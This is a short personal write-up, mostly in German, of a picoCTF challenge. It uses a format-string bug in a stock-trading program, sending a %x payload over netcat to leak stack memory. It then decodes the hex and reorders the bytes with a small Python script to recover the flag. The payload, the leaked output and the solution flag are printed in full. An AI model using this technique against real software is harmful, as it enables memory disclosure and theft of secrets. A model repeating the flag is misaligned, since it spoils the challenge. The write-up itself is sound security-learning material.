Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 27912

Hints:
Okay, maybe I'd believe you if you find my API key.


Prozess:

wget vuln.c

in vuln.c ist auf linie 93 eine Möglichkeit für eine Format string attack, da in printf(user_buf); der user_buf nicht in quotes ist

	
─# pwn template --host mercury.picoctf.net --port 27912 vuln.c


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()




└─# nc mercury.picoctf.net 27912

Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x (Eingegeben)

Ausgabe:
Buying stonks with token:
80633f0804b00080489c3f7fa4d80ffffffff18061160f7fb2110f7fa4dc708062180180633d080633f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3266633130613130ffdb007df7fdfaf8f7fb2440e31a7a0010f7e41ce9f7fb30c0f7fa45c0f7fa4000ffdb7908f7e3268df7fa45c08048ecaffdb79140f7fc6f09804b000f7fa4000f7fa4e20ffdb7948f7fccd50f7fa5890e31a7a00f7fa4000
Portfolio as of Tue Aug 22 09:59:26 UTC 2023


Im ASCII converter kommt das raus:
ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10ÿÛ}


Neues Skript erstellen welches die Zeichen neu anordnet:

#usr/bin/bash

s='ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10ÿÛ}'

list = [i for i in s]

for x in range(0,len(list),4):
	print(list[(x+3)]+list[(x+2)]+list[(x+1)]+list[x], end='')
	
	
Run the script:
picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0
and add a }




